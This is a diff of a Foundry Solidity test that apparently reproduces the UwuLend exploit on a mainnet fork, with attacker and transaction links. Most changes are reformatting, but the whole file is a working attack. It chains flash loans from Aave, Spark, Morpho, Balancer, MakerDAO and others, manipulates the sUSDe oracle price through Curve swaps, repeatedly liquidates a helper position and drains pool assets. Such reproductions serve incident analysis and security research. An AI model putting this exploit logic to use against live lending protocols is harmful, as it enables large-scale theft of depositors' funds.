@@ -4,7 +4,7 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./../interface.sol";
 
-// @KeyInfo - Total Lost : ~$19.3M 
+// @KeyInfo - Total Lost : ~$19.3M
 // TX : https://app.blocksec.com/explorer/tx/eth/0x242a0fb4fde9de0dc2fd42e8db743cbc197ffa2bf6a036ba0bba303df296408b
 // Attacker : https://etherscan.io/address/0x841ddf093f5188989fa1524e7b893de64b421f47
 // Attack Contract : https://etherscan.io/address/0xf19d66e82ffe8e203b30df9e81359f8a201517ad
@@ -18,7 +18,9 @@ interface IcrvUSDController {
 }
 
 interface IAaveOracle {
-    function getAssetPrice(address asset) external view returns (uint256);
+    function getAssetPrice(
+        address asset
+    ) external view returns (uint256);
 }
 
 interface ISDAI is IERC20 {
@@ -68,13 +70,13 @@ contract UwuLend_First_exp is Test {
 
     uint256 constant WETHMAXLTV = 8500; // 85%
     uint256 constant LiquidationThreshold = 9000; // 90%
-    uint256 constant liquidationBonus = 11000; // 110%
+    uint256 constant liquidationBonus = 11_000; // 110%
 
     ToBeLiquidatedHelper toBeLiquidatedHelper;
     BorrowHelper borrowHelper;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 20061318);
+        vm.createSelectFork("mainnet", 20_061_318);
         vm.label(address(WETH), "WETH");
         vm.label(address(DAI), "DAI");
         vm.label(address(crvUSD), "crvUSD");
@@ -113,7 +115,6 @@ contract UwuLend_First_exp is Test {
     }
 
     function testExploit() public {
-
         toBeLiquidatedHelper = new ToBeLiquidatedHelper();
         vm.label(address(toBeLiquidatedHelper), "toBeLiquidatedHelper");
         borrowHelper = new BorrowHelper();
@@ -124,7 +125,7 @@ contract UwuLend_First_exp is Test {
         approveAll();
 
         // 2. flashLoan
-        // 2.1 aave flashloan WETH and WBTC        
+        // 2.1 aave flashloan WETH and WBTC
         // 2.2 sparkPool flashloan WETH and WBTC
         // 2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI
         // 2.4 FRAX_USDC_Pair flashloan USDC and FRAX
@@ -132,16 +133,13 @@ contract UwuLend_First_exp is Test {
         // 2.6 makerDaoFlash flashloan DAI
         console.log("2. flashLoan");
         flashLoan();
-        
+
         // 3. exploit logic in onFlashLoan
 
         // 5. profit
 
         emit log_named_decimal_uint("\n  attacker profit", WETH.balanceOf(address(this)), WETH.decimals());
-        
     }
-
-    
 
     // exploit logic
     function onFlashLoan(
@@ -159,7 +157,7 @@ contract UwuLend_First_exp is Test {
         console.log("\n  3. Make bad debt (during liquidation process) position by sUSDE price manipulation \n");
         // 3.1 drive down sUSDE price
         console.log("3.1 drive down sUSDE price");
-        
+
         uint256 sUSDE_price_before = uwuPriceOracle.getAssetPrice(address(sUSDE));
         console.log("sUSDE price before", sUSDE_price_before);
 
@@ -167,15 +165,17 @@ contract UwuLend_First_exp is Test {
 
         uint256 sUSDE_price_after = uwuPriceOracle.getAssetPrice(address(sUSDE));
         console.log("sUSDE price after", sUSDE_price_after);
-        emit log_named_decimal_uint("sUSDE price change ratio ", (sUSDE_price_before - sUSDE_price_after) * 1e8/ sUSDE_price_before, 8);
+        emit log_named_decimal_uint(
+            "sUSDE price change ratio ", (sUSDE_price_before - sUSDE_price_after) * 1e8 / sUSDE_price_before, 8
+        );
 
         // 3.2 deposit WBTC DAI sUSDE to uwuLendPool and set WBTC, DAI as collateral
-        
+
         uwuLendPool.deposit(address(WBTC), WBTC.balanceOf(address(this)), address(this), 0);
         uwuLendPool.deposit(address(DAI), DAI.balanceOf(address(this)) - 30_000_000 ether, address(this), 0);
         uwuLendPool.deposit(address(sUSDE), sUSDE.balanceOf(address(this)), address(this), 0);
         uwuLendPool.setUserUseReserveAsCollateral(address(sUSDE), false);
-        
+
         // 3.3 transfer WETH to toBeLiquidatedHelper contract and create sUSDE debt position to max ltv
         console.log("\n  3.3 transfer WETH to toBeLiquidatedHelper contract and create sUSDE debt position to max ltv");
         console.log("-------------------------------helper contract open position -----------------------------------");
@@ -185,20 +185,27 @@ contract UwuLend_First_exp is Test {
         addETHCollateralToHelper();
         toBeLiquidatedHelper.openPosition();
 
-        (uint256 totalCollateral, uint256 totalDebt, uint256 availableBorrows, uint256 currentLiquidationThreshold, uint256 ltv, uint256 healthFactor) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));
-        
+        (
+            uint256 totalCollateral,
+            uint256 totalDebt,
+            uint256 availableBorrows,
+            uint256 currentLiquidationThreshold,
+            uint256 ltv,
+            uint256 healthFactor
+        ) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));
+
         emit log_named_decimal_uint("to be liquidated position debt value", totalDebt, 8);
-        uint256 currentLTV = totalDebt * 1e4 /  totalCollateral;
+        uint256 currentLTV = totalDebt * 1e4 / totalCollateral;
         emit log_named_decimal_uint("current ltv", currentLTV, 4);
         emit log_named_decimal_uint("maxLtv", WETHMAXLTV, 4);
         emit log_named_decimal_uint("current healthFactor", healthFactor, 18);
 
-        // 3.4 liquidation threshold reached by withdraw collateral 
+        // 3.4 liquidation threshold reached by withdraw collateral
         console.log("\n  3.4 liquidation threshold reached by withdraw collateral");
         toBeLiquidatedHelper.withdrawCollateralToLiquidationThreshold();
-        
-        (totalCollateral, totalDebt, , , , healthFactor) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));
-        currentLTV = totalDebt * 1e4 /  totalCollateral;
+
+        (totalCollateral, totalDebt,,,, healthFactor) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));
+        currentLTV = totalDebt * 1e4 / totalCollateral;
         emit log_named_decimal_uint("current ltv", currentLTV, 4);
         emit log_named_decimal_uint("maxLtv", WETHMAXLTV, 4);
         emit log_named_decimal_uint("current healthFactor", healthFactor, 18);
@@ -215,26 +222,35 @@ contract UwuLend_First_exp is Test {
 
         uint256 sUSDE_price_after_driveUp = uwuPriceOracle.getAssetPrice(address(sUSDE));
         console.log("sUSDE price after", sUSDE_price_after_driveUp);
-        emit log_named_decimal_uint("sUSDE price change ratio ", (sUSDE_price_after_driveUp - sUSDE_price_before_driveUp) * 1e8 / sUSDE_price_before_driveUp, 8);
+        emit log_named_decimal_uint(
+            "sUSDE price change ratio ",
+            (sUSDE_price_after_driveUp - sUSDE_price_before_driveUp) * 1e8 / sUSDE_price_before_driveUp,
+            8
+        );
 
         // 4. liquidate helper contract to theft assets from protocol
-        
+
         console.log("\n  4. liquidate helper contract to theft assets from protocol");
-        (totalCollateral, totalDebt, , , ltv, healthFactor) = uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));
+        (totalCollateral, totalDebt,,, ltv, healthFactor) =
+            uwuLendPool.getUserAccountData(address(toBeLiquidatedHelper));
         emit log_named_decimal_uint("total collateral value", totalCollateral, 8);
         emit log_named_decimal_uint("total debt value", totalDebt, 8);
-        currentLTV = totalDebt * 1e4 /  totalCollateral;
+        currentLTV = totalDebt * 1e4 / totalCollateral;
         emit log_named_decimal_uint("current ltv", currentLTV, 4);
         emit log_named_decimal_uint("health factor", healthFactor, 18);
         uint256 badDebtRatio = currentLTV * liquidationBonus / 1e4 - 1e4;
         emit log_named_decimal_uint("bad debt ratio", badDebtRatio, 4);
 
-        // 4.1 repeat liquidate helper contract 
+        // 4.1 repeat liquidate helper contract
         console.log("\n  4.1 repeat liquidate helper contract");
-        uwuLendPool.liquidationCall(address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true);
-        while(uWETH.balanceOf(address(toBeLiquidatedHelper)) > 0) {
+        uwuLendPool.liquidationCall(
+            address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true
+        );
+        while (uWETH.balanceOf(address(toBeLiquidatedHelper)) > 0) {
             uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), address(this));
-            uwuLendPool.liquidationCall(address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true);
+            uwuLendPool.liquidationCall(
+                address(WETH), address(sUSDE), address(toBeLiquidatedHelper), sUSDE.balanceOf(address(this)), true
+            );
         }
 
         // 4.2 withdraw deposited collateral from uwuLendPool
@@ -247,56 +263,62 @@ contract UwuLend_First_exp is Test {
         uwuLendPool.withdraw(address(DAI), uDAI.balanceOf(address(this)), address(this));
         uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), address(this));
 
-        
-        emit log_named_decimal_uint("\n  attacker stolen uSUSDE balance", uSUSDE.balanceOf(address(this)), uSUSDE.decimals());
-        uint256 stolenuSUSDEValue = uSUSDE.balanceOf(address(this)) * uwuPriceOracle.getAssetPrice(address(sUSDE)) / 1e18;
+        emit log_named_decimal_uint(
+            "\n  attacker stolen uSUSDE balance", uSUSDE.balanceOf(address(this)), uSUSDE.decimals()
+        );
+        uint256 stolenuSUSDEValue =
+            uSUSDE.balanceOf(address(this)) * uwuPriceOracle.getAssetPrice(address(sUSDE)) / 1e18;
         emit log_named_decimal_uint("stolen uSUSDE value", stolenuSUSDEValue, 8);
 
-        uwuLendPool.deposit(address(sUSDE), 4346738161827961681800155, address(this), 0);
+        uwuLendPool.deposit(address(sUSDE), 4_346_738_161_827_961_681_800_155, address(this), 0);
         uSUSDE.transfer(address(borrowHelper), uSUSDE.balanceOf(address(this)));
 
-        // 4.3 Borrowing other assets with stolen sUSDE  
+        // 4.3 Borrowing other assets with stolen sUSDE
         console.log("\n  4.3 Borrowing other assets with stolen sUSDE");
         borrowHelper.borrow();
-        
+
         // 4.4 swap assets to repay flashloan
         console.log("\n  4.4 swap assets to repay flashloan");
         // swap USDE to crvUSD
-        USDecrvUSDPool.exchange(0, 1, 4207072750824992858620994, 0, address(this));
+        USDecrvUSDPool.exchange(0, 1, 4_207_072_750_824_992_858_620_994, 0, address(this));
         // swap USDE to DAI
-        USDeDAIPool.exchange(0, 1, 10922948419648084328018472, 0, address(this));
+        USDeDAIPool.exchange(0, 1, 10_922_948_419_648_084_328_018_472, 0, address(this));
         // swap USDE to FRAX
-        FRAXUSDePool.exchange(1, 0, 22726036777489049150148818, 0, address(this));
+        FRAXUSDePool.exchange(1, 0, 22_726_036_777_489_049_150_148_818, 0, address(this));
         // swap USDE to GHO
-        GHOUSDePool.exchange(1, 0, 3839532488615605211975616, 0, address(this));
+        GHOUSDePool.exchange(1, 0, 3_839_532_488_615_605_211_975_616, 0, address(this));
         // swap USDE to USDC
-        USDCUSDePool.exchange(0, 1, 13004083286363350285706546, 0, address(this));
+        USDCUSDePool.exchange(0, 1, 13_004_083_286_363_350_285_706_546, 0, address(this));
 
         // repay crvUSD loan
         crvUSDController.repay(8_000_000 ether, address(this), type(int256).max, false);
-        // swap GHO to USDE 
-        GHOUSDePool.exchange(0, 1, 6514807919582140746012, 0, address(this));
+        // swap GHO to USDE
+        GHOUSDePool.exchange(0, 1, 6_514_807_919_582_140_746_012, 0, address(this));
         // swap sUSDE to sDAI
         sUSDE.approve(address(MtEthena), type(uint256).max);
-        MtEthena.exchange(1, 0, 461496017260554794537319, 0, address(this));
+        MtEthena.exchange(1, 0, 461_496_017_260_554_794_537_319, 0, address(this));
         sDAI.redeem(sDAI.balanceOf(address(this)), address(this), address(this));
         // swap crvUSD to USDE
-        USDecrvUSDPool.exchange(1, 0, 13674859859068798018828, 0, address(this));
+        USDecrvUSDPool.exchange(1, 0, 13_674_859_859_068_798_018_828, 0, address(this));
         // swap USDC to USDE
-        USDCUSDePool.exchange(1, 0, 192649121137, 0, address(this));
+        USDCUSDePool.exchange(1, 0, 192_649_121_137, 0, address(this));
         // swap USDE to USDC
-        USDCUSDePool.exchange(0, 1, 5476157462097941699706, 0, address(this));
+        USDCUSDePool.exchange(0, 1, 5_476_157_462_097_941_699_706, 0, address(this));
         // swap FRAX to DAI
-        DAI_FRAX_Pair.swap(address(this), false, 43839520259800487407899, 88130155430238081648620165685, "");
+        DAI_FRAX_Pair.swap(
+            address(this), false, 43_839_520_259_800_487_407_899, 88_130_155_430_238_081_648_620_165_685, ""
+        );
 
         // swap DAI to USDC
-        int256 swapAmount = int256(DAI.balanceOf(address(this)) - (100786052157846064524359193 + 500000000000000000000000000));
-        DAI_USDC_Pair.swap(address(this), true, swapAmount, 71305012436624238479427, "");
+        int256 swapAmount = int256(
+            DAI.balanceOf(address(this)) - (100_786_052_157_846_064_524_359_193 + 500_000_000_000_000_000_000_000_000)
+        );
+        DAI_USDC_Pair.swap(address(this), true, swapAmount, 71_305_012_436_624_238_479_427, "");
         // swap USDC to WETH
-        swapAmount = int256(USDC.balanceOf(address(this)) - 15007500000000);
-        USDC_WETH_Pair.swap(address(this), true, swapAmount, 1176655315611429354240742931620633, "");
+        swapAmount = int256(USDC.balanceOf(address(this)) - 15_007_500_000_000);
+        USDC_WETH_Pair.swap(address(this), true, swapAmount, 1_176_655_315_611_429_354_240_742_931_620_633, "");
         // swap WETH to WBTC
-        WBTC_WETH_Pair.swap(address(this), false, -740000000, 38270603846108809178175541220721878, "");
+        WBTC_WETH_Pair.swap(address(this), false, -740_000_000, 38_270_603_846_108_809_178_175_541_220_721_878, "");
 
         bytes32 CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
         return CALLBACK_SUCCESS;
@@ -325,53 +347,47 @@ contract UwuLend_First_exp is Test {
 
     function flashLoan() internal {
         console.log("");
-        
+
         console.log("2.1 aave flashloan WETH and WBTC");
         address[] memory assets_1 = new address[](2);
         assets_1[0] = address(WETH);
         assets_1[1] = address(WBTC);
         uint256[] memory amounts_1 = new uint256[](2);
-        amounts_1[0] = 159053162780836655603083;
-        amounts_1[1] = 1480000000000;
+        amounts_1[0] = 159_053_162_780_836_655_603_083;
+        amounts_1[1] = 1_480_000_000_000;
         uint256[] memory modes_1 = new uint256[](2);
         modes_1[0] = 0;
         modes_1[1] = 0;
-        aaveFlashloan_1.flashLoan(address(this), assets_1, amounts_1, modes_1, address(0), "", 0);   
-        
+        aaveFlashloan_1.flashLoan(address(this), assets_1, amounts_1, modes_1, address(0), "", 0);
     }
-
-    
 
     function driveDownsUSDEPrice() internal {
         // mint crvUSD
         crvUSDController.create_loan(10_000 ether, 8_000_000 ether, 6);
-        
+
         // swap USDE to crvUSD
-        USDecrvUSDPool.exchange(0, 1, 8730453498050216501648556, 0, address(this));
+        USDecrvUSDPool.exchange(0, 1, 8_730_453_498_050_216_501_648_556, 0, address(this));
         // swap USDE to DAI
-        USDeDAIPool.exchange(0, 1, 14477791691163726567797192, 0, address(this));
+        USDeDAIPool.exchange(0, 1, 14_477_791_691_163_726_567_797_192, 0, address(this));
         // swap USDE to FRAX
-        FRAXUSDePool.exchange(1, 0, 46652158056743271680044538, 0, address(this));
+        FRAXUSDePool.exchange(1, 0, 46_652_158_056_743_271_680_044_538, 0, address(this));
         // swap USDE to GHO
-        GHOUSDePool.exchange(1, 0, 4925427200616322077942681, 0, address(this));
+        GHOUSDePool.exchange(1, 0, 4_925_427_200_616_322_077_942_681, 0, address(this));
         // swap USDE to USDC
-        USDCUSDePool.exchange(0, 1, 14886912832938992141787347, 0, address(this));
+        USDCUSDePool.exchange(0, 1, 14_886_912_832_938_992_141_787_347, 0, address(this));
     }
 
     function driveUpsUSDEPrice() internal {
-
         // swap crvUSD to USDE
-        USDecrvUSDPool.exchange(1, 0, 12924955610043587089395372, 0, address(this));
+        USDecrvUSDPool.exchange(1, 0, 12_924_955_610_043_587_089_395_372, 0, address(this));
         // swap DAI to USDE
-        USDeDAIPool.exchange(1, 0, 25373741448450577167233296, 0, address(this));
+        USDeDAIPool.exchange(1, 0, 25_373_741_448_450_577_167_233_296, 0, address(this));
         // swap FRAX to USDE
-        FRAXUSDePool.exchange(0, 1, 69315752743500180119051361, 0, address(this));
+        FRAXUSDePool.exchange(0, 1, 69_315_752_743_500_180_119_051_361, 0, address(this));
         // swap GHO to USDE
-        GHOUSDePool.exchange(0, 1, 8765879316233443559385780, 0, address(this));
+        GHOUSDePool.exchange(0, 1, 8_765_879_316_233_443_559_385_780, 0, address(this));
         // swap USDC to USDE
-        USDCUSDePool.exchange(1, 0, 27858597561515, 0, address(this));
-
-
+        USDCUSDePool.exchange(1, 0, 27_858_597_561_515, 0, address(this));
     }
 
     // aaveFlashloan_1 callback
@@ -390,7 +406,7 @@ contract UwuLend_First_exp is Test {
             address[] memory assets_2 = new address[](1);
             assets_2[0] = address(WETH);
             uint256[] memory amounts_2 = new uint256[](1);
-            amounts_2[0] = 40000000000000000000000;
+            amounts_2[0] = 40_000_000_000_000_000_000_000;
             uint256[] memory modes_2 = new uint256[](1);
             modes_2[0] = 0;
             aaveFlashloan_2.flashLoan(address(this), assets_2, amounts_2, modes_2, address(0), "", 0);
@@ -404,8 +420,8 @@ contract UwuLend_First_exp is Test {
             assets_3[0] = address(WETH);
             assets_3[1] = address(WBTC);
             uint256[] memory amounts_3 = new uint256[](2);
-            amounts_3[0] = 91075709275272202604853;
-            amounts_3[1] = 497979338310;
+            amounts_3[0] = 91_075_709_275_272_202_604_853;
+            amounts_3[1] = 497_979_338_310;
             uint256[] memory modes_3 = new uint256[](2);
             modes_3[0] = 0;
             modes_3[1] = 0;
@@ -417,24 +433,24 @@ contract UwuLend_First_exp is Test {
 
             // 2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI
             console.log("2.3 morphoBlueFlashLoan flashloan sUSDE USDE DAI");
-            morphoBlueFlashLoan.flashLoan(address(sUSDE), 301738880017013808137779682, "");
+            morphoBlueFlashLoan.flashLoan(address(sUSDE), 301_738_880_017_013_808_137_779_682, "");
             return true;
         }
     }
 
     function onMorphoFlashLoan(uint256 amounts, bytes calldata) external {
-        if (amounts == 301738880017013808137779682) {
+        if (amounts == 301_738_880_017_013_808_137_779_682) {
             sUSDE.approve(address(morphoBlueFlashLoan), type(uint256).max);
-            morphoBlueFlashLoan.flashLoan(address(USDE), 236934023171356495803977358, "");
-        } else if (amounts == 236934023171356495803977358) {
+            morphoBlueFlashLoan.flashLoan(address(USDE), 236_934_023_171_356_495_803_977_358, "");
+        } else if (amounts == 236_934_023_171_356_495_803_977_358) {
             USDE.approve(address(morphoBlueFlashLoan), type(uint256).max);
-            morphoBlueFlashLoan.flashLoan(address(DAI), 100786052157846064524359193, "");
-        } else if (amounts == 100786052157846064524359193) {
+            morphoBlueFlashLoan.flashLoan(address(DAI), 100_786_052_157_846_064_524_359_193, "");
+        } else if (amounts == 100_786_052_157_846_064_524_359_193) {
             DAI.approve(address(morphoBlueFlashLoan), type(uint256).max);
 
             // 2.4 FRAX_USDC_Pair flashloan USDC and FRAX
             console.log("2.4 FRAX_USDC_Pair flashloan USDC and FRAX");
-            FRAX_USDC_Pair.flash(address(this), 60000000000000000000000000, 15000000000000, "");
+            FRAX_USDC_Pair.flash(address(this), 60_000_000_000_000_000_000_000_000, 15_000_000_000_000, "");
         }
     }
 
@@ -445,11 +461,11 @@ contract UwuLend_First_exp is Test {
         tokens[0] = address(GHO);
         tokens[1] = address(WETH);
         uint256[] memory amounts = new uint256[](2);
-        amounts[0] = 4627557475392554171233727;
-        amounts[1] = 38413346774514588021409;
+        amounts[0] = 4_627_557_475_392_554_171_233_727;
+        amounts[1] = 38_413_346_774_514_588_021_409;
         BalancerVault.flashLoan(address(this), tokens, amounts, "");
-        FRAX.transfer(address(msg.sender), 60030000000000000000000000);
-        USDC.transfer(address(msg.sender), 15007500000000);
+        FRAX.transfer(address(msg.sender), 60_030_000_000_000_000_000_000_000);
+        USDC.transfer(address(msg.sender), 15_007_500_000_000);
     }
 
     function receiveFlashLoan(
@@ -460,22 +476,40 @@ contract UwuLend_First_exp is Test {
     ) external {
         // 2.6 makerDaoFlash flashloan DAI
         console.log("2.6 makerDaoFlash flashloan DAI \n");
-        makerDaoFlash.flashLoan(address(this), address(DAI), 500000000000000000000000000, ""); 
+        makerDaoFlash.flashLoan(address(this), address(DAI), 500_000_000_000_000_000_000_000_000, "");
 
-        GHO.transfer(address(msg.sender), 4627557475392554171233727);
-        WETH.transfer(address(msg.sender), 38413346774514588021409);
+        GHO.transfer(address(msg.sender), 4_627_557_475_392_554_171_233_727);
+        WETH.transfer(address(msg.sender), 38_413_346_774_514_588_021_409);
     }
 
     function logFlashLoanAssets() internal {
-        emit log_named_decimal_uint("Attacker WETH balance after flashloan", WETH.balanceOf(address(this)), WETH.decimals());
-        emit log_named_decimal_uint("Attacker WBTC balance after flashloan", WBTC.balanceOf(address(this)), WBTC.decimals());
-        emit log_named_decimal_uint("Attacker sUSDE balance after flashloan", sUSDE.balanceOf(address(this)), sUSDE.decimals());
-        emit log_named_decimal_uint("Attacker USDE balance after flashloan", USDE.balanceOf(address(this)), USDE.decimals());
-        emit log_named_decimal_uint("Attacker DAI balance after flashloan", DAI.balanceOf(address(this)), DAI.decimals());
-        emit log_named_decimal_uint("Attacker FRAX balance after flashloan", FRAX.balanceOf(address(this)), FRAX.decimals());
-        emit log_named_decimal_uint("Attacker USDC balance after flashloan", USDC.balanceOf(address(this)), USDC.decimals());
-        emit log_named_decimal_uint("Attacker GHO balance after flashloan", GHO.balanceOf(address(this)), GHO.decimals());
-        uint256 flashloan_value = WETH.balanceOf(address(this)) * 3500 + WBTC.balanceOf(address(this)) * 65000 * 1e10 + sUSDE.balanceOf(address(this)) + USDE.balanceOf(address(this)) + DAI.balanceOf(address(this)) + FRAX.balanceOf(address(this)) + USDC.balanceOf(address(this)) *1e12 + GHO.balanceOf(address(this));
+        emit log_named_decimal_uint(
+            "Attacker WETH balance after flashloan", WETH.balanceOf(address(this)), WETH.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker WBTC balance after flashloan", WBTC.balanceOf(address(this)), WBTC.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker sUSDE balance after flashloan", sUSDE.balanceOf(address(this)), sUSDE.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker USDE balance after flashloan", USDE.balanceOf(address(this)), USDE.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker DAI balance after flashloan", DAI.balanceOf(address(this)), DAI.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker FRAX balance after flashloan", FRAX.balanceOf(address(this)), FRAX.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker USDC balance after flashloan", USDC.balanceOf(address(this)), USDC.decimals()
+        );
+        emit log_named_decimal_uint(
+            "Attacker GHO balance after flashloan", GHO.balanceOf(address(this)), GHO.decimals()
+        );
+        uint256 flashloan_value = WETH.balanceOf(address(this)) * 3500 + WBTC.balanceOf(address(this)) * 65_000 * 1e10
+            + sUSDE.balanceOf(address(this)) + USDE.balanceOf(address(this)) + DAI.balanceOf(address(this))
+            + FRAX.balanceOf(address(this)) + USDC.balanceOf(address(this)) * 1e12 + GHO.balanceOf(address(this));
         emit log_named_decimal_uint("Attacker flashloan USD value", flashloan_value, 18);
     }
 
@@ -487,7 +521,7 @@ contract UwuLend_First_exp is Test {
         crvUSD.approve(address(crvUSDController), type(uint256).max);
         WETH.approve(address(crvUSDController), type(uint256).max);
         WETH.approve(address(crvUSDWETHPool), type(uint256).max);
-        
+
         crvUSD.approve(address(USDecrvUSDPool), type(uint256).max);
         USDE.approve(address(USDecrvUSDPool), type(uint256).max);
         FRAX.approve(address(FRAXUSDePool), type(uint256).max);
@@ -499,11 +533,9 @@ contract UwuLend_First_exp is Test {
         DAI.approve(address(USDeDAIPool), type(uint256).max);
         USDE.approve(address(USDeDAIPool), type(uint256).max);
     }
-
 }
 
 contract ToBeLiquidatedHelper {
-
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 sUSDE = IERC20(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
     ILendingPool uwuLendPool = ILendingPool(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
@@ -515,39 +547,44 @@ contract ToBeLiquidatedHelper {
         uwuLendPool.deposit(address(WETH), WETH.balanceOf(address(this)), address(this), 0);
         uint256 sUSDE_price = uwuPriceOracle.getAssetPrice(address(sUSDE));
 
-        (, , uint256 availableBorrows, , ,) = uwuLendPool.getUserAccountData(address(this));
+        (,, uint256 availableBorrows,,,) = uwuLendPool.getUserAccountData(address(this));
         while (availableBorrows >= sUSDE.balanceOf(address(uSUSDE)) * sUSDE_price / 10 ** sUSDE.decimals()) {
-
             uwuLendPool.borrow(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), 2, 0, address(this));
             sUSDE.transfer(address(msg.sender), sUSDE.balanceOf(address(this)));
-            (bool success, ) = address(msg.sender).call(abi.encodeWithSelector(bytes4(keccak256("depositsUSDEBackToUWULendPool()"))));
+            (bool success,) =
+                address(msg.sender).call(abi.encodeWithSelector(bytes4(keccak256("depositsUSDEBackToUWULendPool()"))));
             require(success, "depositsUSDEBackToUWULendPool failed");
-            (, , availableBorrows, , ,) = uwuLendPool.getUserAccountData(address(this));
-
+            (,, availableBorrows,,,) = uwuLendPool.getUserAccountData(address(this));
         }
 
         uint256 lastAmount = availableBorrows * 10 ** sUSDE.decimals() / sUSDE_price;
         uwuLendPool.borrow(address(sUSDE), lastAmount, 2, 0, address(this));
         sUSDE.transfer(address(msg.sender), sUSDE.balanceOf(address(this)));
-
     }
 
     function withdrawCollateralToLiquidationThreshold() external {
         uint256 sUSDE_price = uwuPriceOracle.getAssetPrice(address(sUSDE));
         uint256 WETH_price = uwuPriceOracle.getAssetPrice(address(WETH));
 
-        (uint256 totalCollateral, uint256 totalDebt, uint256 availableBorrows, uint256 currentLiquidationThreshold, uint256 ltv, uint256 healthFactor) = uwuLendPool.getUserAccountData(address(this));
-        uint256 maxWithdraw = totalCollateral - (totalDebt * 10000 / currentLiquidationThreshold);
+        (
+            uint256 totalCollateral,
+            uint256 totalDebt,
+            uint256 availableBorrows,
+            uint256 currentLiquidationThreshold,
+            uint256 ltv,
+            uint256 healthFactor
+        ) = uwuLendPool.getUserAccountData(address(this));
+        uint256 maxWithdraw = totalCollateral - (totalDebt * 10_000 / currentLiquidationThreshold);
         maxWithdraw = maxWithdraw * 10 ** WETH.decimals() / WETH_price;
         uwuLendPool.withdraw(address(WETH), maxWithdraw, address(this));
 
         WETH.transfer(address(msg.sender), WETH.balanceOf(address(this)));
-
     }
 }
 
 contract BorrowHelper {
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IERC20 uWETH = IERC20(0x67fadbD9Bf8899d7C578db22D7af5e2E500E13e5);
     IERC20 sUSDE = IERC20(0x9D39A5DE30e57443BfF2A8307A4256c8797A3497);
     ILendingPool uwuLendPool = ILendingPool(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
     IERC20 uSUSDE = IERC20(0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6);
@@ -562,21 +599,21 @@ contract BorrowHelper {
     IAaveOracle uwuPriceOracle = IAaveOracle(0xAC4A2aC76D639E10f2C05a41274c1aF85B772598);
 
     function borrow() external {
-        
         uwuLendPool.borrow(address(DAI), DAI.balanceOf(address(uDAI)), 2, 0, address(this));
         uwuLendPool.borrow(address(USDT), USDT.balanceOf(address(uUSDT)), 2, 0, address(this));
+        uwuLendPool.borrow(address(WETH), WETH.balanceOf(address(uWETH)), 2, 0, address(this));
+        uwuLendPool.borrow(address(WBTC), WBTC.balanceOf(address(uWBTC)), 2, 0, address(this));
         uwuLendPool.withdraw(address(sUSDE), sUSDE.balanceOf(address(uSUSDE)), msg.sender);
 
-        USDT_WETH_Pair.swap(address(this), false, int256(USDT.balanceOf(address(this))), 5334772629276810319154680, new bytes(0));
+        USDT_WETH_Pair.swap(
+            address(this), false, int256(USDT.balanceOf(address(this))), 5_334_772_629_276_810_319_154_680, new bytes(0)
+        );
         DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
-        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
-        
     }
 
     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
-        address(USDT).call(abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), msg.sender, uint256(amount1Delta)));
+        address(USDT).call(
+            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), msg.sender, uint256(amount1Delta))
+        );
     }
 }
-
-
-
